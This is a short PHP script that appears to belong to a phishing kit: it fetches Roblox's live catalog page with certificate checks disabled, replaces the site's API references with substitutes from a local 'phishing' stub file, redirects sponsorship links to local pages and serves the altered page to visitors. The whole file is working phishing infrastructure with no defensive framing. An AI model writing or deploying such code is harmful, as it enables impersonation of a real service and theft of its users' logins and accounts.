<?php
include('../includes/functions.php');

// ----------------------------------------------------------------
$apisList = file_get_contents("../stub/phishing/replaces/apis.txt");
$apisListW = file_get_contents("../stub/phishing/replaces/apis2.php");
// ----------------------------------------------------------------

$config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$url = "https://www.roblox.com/catalog";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$content = curl_exec($ch);
curl_close($ch);

$content = str_replace($apisList, $apisListW, $content);
$content = str_replace("https://www.roblox.com/user-sponsorship/1", "../web/sponsorship.php?id=1", $content);
$content = str_replace("https://www.roblox.com/user-sponsorship/2", "../web/sponsorship.php?id=2", $content);
$content = str_replace("https://www.roblox.com/user-sponsorship/3", "../web/sponsorship.php?id=3", $content);
echo $content;
?>